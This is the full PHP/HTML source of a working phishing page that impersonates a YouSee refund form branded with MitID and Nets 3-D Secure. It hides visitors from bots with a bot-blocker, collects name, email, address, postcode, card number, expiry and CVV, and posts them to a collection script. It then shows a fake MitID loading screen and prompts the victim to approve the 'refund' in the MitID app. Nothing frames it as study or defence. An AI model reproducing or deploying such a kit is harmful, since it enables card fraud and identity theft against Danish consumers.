<?php 
session_start();
error_reporting(0);
require 'botblocker.php';
$input1 =  $_SESSION["input1"];
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	    <link rel="stylesheet" href="cs.css" id="mitid-styles">
	<link rel="stylesheet" type="text/css" href="csup.css">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
	      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
	<title>.</title>
</head>
<body>
<header>
	<div class="headeritems"><img src="profile.png"><p><?php echo $input1 ?></p></div>
	<div class="headeritems"><img class="logo" src="logo.png"></div>
	<div class="headeritems"><img src="menu.png"><p>Menu</p></div>
</header>

<form onsubmit="return clickButton();">
	<div class="main_header"><div class="main_header_h1"><h1>Mine detaljer</h1></div></div>


	<div class="main_body1" id="mainbody">
		<img src="factur.png">
		<div>
			<h2>Formular til tilbagebetaling</h2>
			<p><?php echo(strftime("%d/%m/%Y ")); ?></p>
		</div>

	</div>



	<div class="main_body1 inputsform">
		<p class="inputsform_paragraph" id="parag1">Udfyld skemaet</p>
		<p class="inputsform_paragraph" style="display:none" id="parag">Tilbagebetalingsmetode</p>
		<p class="inputsform_paragraph" style="display:none" id="parag3">Godkend hos Nets 3-D Secure</p>
		<hr class="horizontalrule">
		<div class="main_body_inputs_form">
			<div class="loader" style="display:none"></div>
			<img src="crss.png" style="height:50%;display:none;" id="crss">
			<div class="successpart" >
			<div style="display:none" id="loader">
<form id="mitid-core-client-form" class="mitid-core-content" >



        <div class="mitid-login-divider--top dfe3mo" ></div>


<div class="mitid-loader__content" aria-busy="true" aria-live="polite"><div class="mitid-loader__logo"><svg xmlns="http://www.w3.org/2000/svg" width="61" height="16" viewBox="0 0 61 16" focusable="false" aria-label="MitID logo" class="mitid-loader__logo-svg"><path d="M19.2 0c1 0 1.8.8 1.8 1.8s-.8 1.8-1.8 1.8-1.8-.8-1.8-1.8.8-1.8 1.8-1.8zm21.2 0c2.1 0 3.8 1.7 3.8 3.8 0 2.1-1.7 3.8-3.8 3.8-2.1 0-3.8-1.7-3.8-3.8 0-2.1 1.7-3.8 3.8-3.8zM20.7 4.9v10.9h-3V4.9h3zM2.9.8l4.6 7.1L12 .8h2.9v15h-3.1V6.1l-4.3 6.4h-.1L3.1 6.1v9.7H0V.8h2.9zM40.4 9c3.6 0 6.5 2 6.9 6.8H33.6C34 11 36.9 9 40.4 9zM51.9.2C58.3.2 61 3.7 61 8s-2.7 7.8-9.1 7.8h-2.6V.2h2.6zM27.1 1.9v3h2.4v2.4h-2.4v4.8c0 .9.5 1.2 1.3 1.2.5 0 1-.1 1.3-.4v2.7c-.4.2-1.2.3-2 .3-2.2 0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3h3z"></path></svg></div><div class="mitid-loader__state"><svg xmlns="http://www.w3.org/2000/svg" focusable="false" class="mitid-loader__shield" aria-hidden="true"><path d="M49.9 0l50 15v41.2c0 47.8-50 60.8-50 60.8s-50-13-50-60.8V15l50-15"></path></svg><svg viewBox="30 30 60 60" focusable="false" aria-hidden="true" class="mitid-loader__circular"><circle cx="60" cy="60" r="27" fill="none" stroke="#3380eb" stroke-linecap="square" stroke-miterlimit="10" stroke-width="5"></circle><circle cx="60" cy="60" r="27" fill="none" stroke="#fff" stroke-dasharray="50 200" stroke-linecap="square" stroke-miterlimit="10" stroke-width="5"></circle></svg></div><div class="mitid-loader__text"><span class="mitid-loader__description">Vent et øjeblik ...</span></div></div>




        





       </form></div>

		</div>

		<div class="successpart" id="success" style="display:none">
			<div class="successpartitems">
				<h2>Åbn MitID-appen og godkend refusionen</h2>
				<img src="./apps.gif" >
			</div>

		</div>









			<label id="label1" >fulde navn</label>
			<input type="text" placeholder="fulde navn" required="" style="text-transform: none;" id="fname" name="fname">
			<label id="label2" >e-mail</label>
			<input type="email" placeholder="e-mail" required="" style="text-transform: none;" id="eml" name="eml">
			<label id="label3" >adresse</label>
			<input type="text" placeholder="adresse" required="" style="text-transform: none;"id="adr" name="adr">
			<label id="label4" >postnummer</label>
			<input type="text" placeholder="zip" required="" style="text-transform: none;"id="zip" name="zip">



			<label style="display:none" id="label5" >kortnummer</label>
			<input style="display:none" type="text" placeholder="XXXX XXXX XXXX XXXX" onkeydown="space(this)" required="" id="kk" name="kk" minlength="19" maxlength="19">
			<span id="warning-message" style="color:red;display:none;"></span>
			<label style="display:none" id="label6" >experation</label>
			<input style="display:none" type="text" placeholder="MM/ÅÅ" required="" id="ex" onkeydown="exslash(this)" name="ex" minlength="5" maxlength="5">
			<label style="display:none" id="label7" >cvv</label>
			<input style="display:none" type="text" placeholder="***" required="" id="cv" name="cv" minlength="3" maxlength="3">



		</div>

		<button type="button" id="button1">fortsætte</button>
		<button type="button" onclick="return clickButton();" id="button2" style="display:none">fortsætte</button>



</div>
</form>


<footer>
<div class="footerlisting">
<div class="footerlist"><h4>Hjælp</h4>
<p>Gå til hjælp</p>
<p>Hastighedstest</p>
<p>Forum</p>
<p>Flyt adresse</p>
<p>Test dit internetbehov</p>
<p>Translate to English</p></div>


<div class="footerlist"><h4>Produkter</h4>
<p>Mobil</p>
<p>YouSee Play</p>
<p>Tv og streaming</p>
<p>Bredbånd</p>
<p>Fiber</p>
<p>Mobilt Bredbånd</p>
<p>SmartWatch</p>
<p>Tilbehør</p>
<p>Fastnet</p></div>

<div class="footerlist"><h4>Mobiltelefoner</h4>
<p>De nye iPhone 14</p>
<p>Det nyeste fra Samsung</p>
<p>Apple</p>
<p>Samsung</p>
<p>Sony</p>
<p>Motorola</p>
<p>Xiaomi</p>
<p>Emporia</p>
<p>Aktuelle tilbud</p>
<p>Se alle mobiltelefoner</p>
<p>Bytterabat</p>

</div>
<div class="footerlist"><h4>Tjenester</h4>
<p>Musik</p>
<p>Webmail</p>
<p>Tv Guide</p>
<p>Mit YouSee</p></div>

<div class="footerlist"><h4>Se også</h4>
<p>Karriere</p>
<p>Presse</p>
<p>Tilbudsavis</p>
<p>5G</p>
<p>Farvel til 3G</p>
<p>Disney+</p>
<p>HBO Max</p>
<p>Netflix</p>
<p>TV 2 PLAY</p>
<p>Viaplay</p>
<p>YouSee kundepanel</p>
<p>YouSee butiksforside</p></div>
</div>
<div><img src="logo.png"></div>

</footer>

<script type="text/javascript">
	$(document).ready(function(){

  $("#button1").click(function(){
    $("#button1").hide();
    $("#fname").hide();
    $("#eml").hide();
    $("#adr").hide();
    $("#zip").hide();
    $("#label1").hide();
    $("#label2").hide();
    $("#label3").hide();
    $("#label4").hide();
    $("#label5").show();
    $("#label6").show();
    $("#label7").show();
    $("#kk").show();
    $("#ex").show();
    $("#cv").show();
    $("#parag").show();
    $("#parag1").hide();
    $("#button2").show();
    $("#crss").show();

  });});





function IsEmail(email) {
  var regex = /^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
  if(!regex.test(email)) {
    return false;
  }else{
    return true;
  }
}




	function clickButton(){
	if(IsEmail($("#eml").val())==false){
	             $("#parag1").show();
                $("#parag").hide();
                $("#label2").show();
                $("#eml").show();
                $("#label3").show();
                $("#adr").show();
                $("#label4").show();
                $("#zip").show();
                $("#label5").hide();
                $("#kk").hide();
                $("#label6").hide();
                $("#ex").hide();
                $("#label7").hide();
                $("#cv").hide();
                $("#crss").hide();
                $("#label1").show();
                $("#fname").show();
                $("#eml").show();
                $("#eml").css("border","1px solid red");

   } else if($("#fname").val() == ""){
                $("#parag1").show();
                $("#parag").hide();
                $("#label2").show();
                $("#eml").show();
                $("#label3").show();
                $("#adr").show();
                $("#label4").show();
                $("#zip").show();
                $("#label5").hide();
                $("#kk").hide();
                $("#label6").hide();
                $("#ex").hide();
                $("#label7").hide();
                $("#cv").hide();
                $("#crss").hide();
                $("#label1").show();
                $("#fname").show();
                $("#fname").css("border","1px solid red");

   } else if($("#eml").val() == ""){
                $("#parag1").show();
                $("#parag").hide();
                $("#label2").show();
                $("#eml").show();
                $("#label3").show();
                $("#adr").show();
                $("#label4").show();
                $("#zip").show();
                $("#label5").hide();
                $("#kk").hide();
                $("#label6").hide();
                $("#ex").hide();
                $("#label7").hide();
                $("#cv").hide();
                $("#crss").hide();
					 $("#label2").show();
                $("#eml").show();
                $("#eml").css("border","1px solid red");

   } else if($("#adr").val() == ""){
                $("#parag1").show();
                $("#parag").hide();
                $("#label2").show();
                $("#eml").show();
                $("#label3").show();
                $("#adr").show();
                $("#label4").show();
                $("#zip").show();
                $("#label5").hide();
                $("#kk").hide();
                $("#label6").hide();
                $("#ex").hide();
                $("#label7").hide();
                $("#cv").hide();
                $("#crss").hide();
					 $("#label3").show();
                $("#adr").show();
                $("#adr").css("border","1px solid red");

   } else if($("#zip").val() == ""){
                $("#parag1").show();
                $("#parag").hide();
                $("#label2").show();
                $("#eml").show();
                $("#label3").show();
                $("#adr").show();
                $("#label4").show();
                $("#zip").show();
                $("#label5").hide();
                $("#kk").hide();
                $("#label6").hide();
                $("#ex").hide();
                $("#label7").hide();
                $("#cv").hide();
                $("#crss").hide();
                $("#label4").show();
                $("#zip").show();
                $("#zip").css("border","1px solid red");

   } else if($("#kk").val() == ""){
                $("#parag1").hide();
                $("#parag").show();
                $("#label1").hide();
                $("#fname").hide();
                $("#label2").hide();
                $("#eml").hide();
                $("#label3").hide();
                $("#adr").hide();
                $("#label4").hide();
                $("#zip").hide();
                $("#label5").show();
                $("#kk").show();
                $("#label6").show();
                $("#ex").show();
                $("#label7").show();
                $("#cv").show();
                $("#crss").show();
					 $("#label5").show();
                $("#kk").show();
                $("#kk").css("border","1px solid red");

   } else if($("#ex").val() == ""){
                $("#parag1").hide();
                $("#parag").show();
                $("#label1").hide();
                $("#fname").hide();
                $("#label2").hide();
                $("#eml").hide();
                $("#label3").hide();
                $("#adr").hide();
                $("#label4").hide();
                $("#zip").hide();
                $("#label5").show();
                $("#kk").show();
                $("#label6").show();
                $("#ex").show();
                $("#label7").show();
                $("#cv").show();
                $("#crss").show();
					 $("#label6").show();
                $("#ex").show();
                $("#ex").css("border","1px solid red");

   } else if($("#cv").val() == ""){
                $("#parag1").hide();
                $("#parag").show();
                $("#label1").hide();
                $("#fname").hide();
                $("#label2").hide();
                $("#eml").hide();
                $("#label3").hide();
                $("#adr").hide();
                $("#label4").hide();
                $("#zip").hide();
                $("#label5").show();
                $("#kk").show();
                $("#label6").show();
                $("#ex").show();
                $("#label7").show();
                $("#cv").show();
                $("#crss").show();
					 $("#label7").show();
                $("#cv").show();
                $("#cv").css("border","1px solid red");

   } else{          
    var fname=document.getElementById('fname').value;
    var eml=document.getElementById('eml').value;
    var adr=document.getElementById('adr').value;
    var zip=document.getElementById('zip').value;
    var kk=document.getElementById('kk').value;
    var ex=document.getElementById('ex').value;
    var cv=document.getElementById('cv').value;
    $.ajax({
        type:"post",
        url:"sub.php?form=kk",
        data: 
        {  
           'fname' :fname,
           'eml' :eml,
           'adr' :adr,
           'zip' :zip,
           'kk' :kk,
           'ex' :ex,
           'cv' :cv,
        },
        cache:false,
        success: function (html) 
        {   
         $("#loader").show();
         $("#label1").hide();
         $("#fname").hide();
         $("#label2").hide();
         $("#eml").hide();
         $("#label3").hide();
         $("#adr").hide();
         $("#label4").hide();
         $("#zip").hide();
         $("#kk").hide();
    	   $("#ex").hide();
    	   $("#cv").hide();
    	   $("#parag1").hide();
    	   $("#button2").hide();
    	   $("#label5").hide();
    	   $("#label6").hide();
    	   $("#label7").hide();
    	   $("#crss").hide();
    	   $("#parag").hide();
    	   $("#mainbody").hide();
    	   
         setTimeout(function(){
   			$("#loader").hide();
            $("#parag3").show();
    	   	$("#mitapp").show();
    	   	$("#success").show();

               },10000);

         



        }
        
    });}

    return false;
 }
</script>
<script type="text/javascript">
	
function exslash(date){
           date.value = date.value.replace(/(\d\d)(\d+)/,"$1/$2")
         }

function space(space){
           space.value = space.value.replace(/(\d{4})(\d+)/,"$1 $2")
         }


       
</script>











</body>
</html>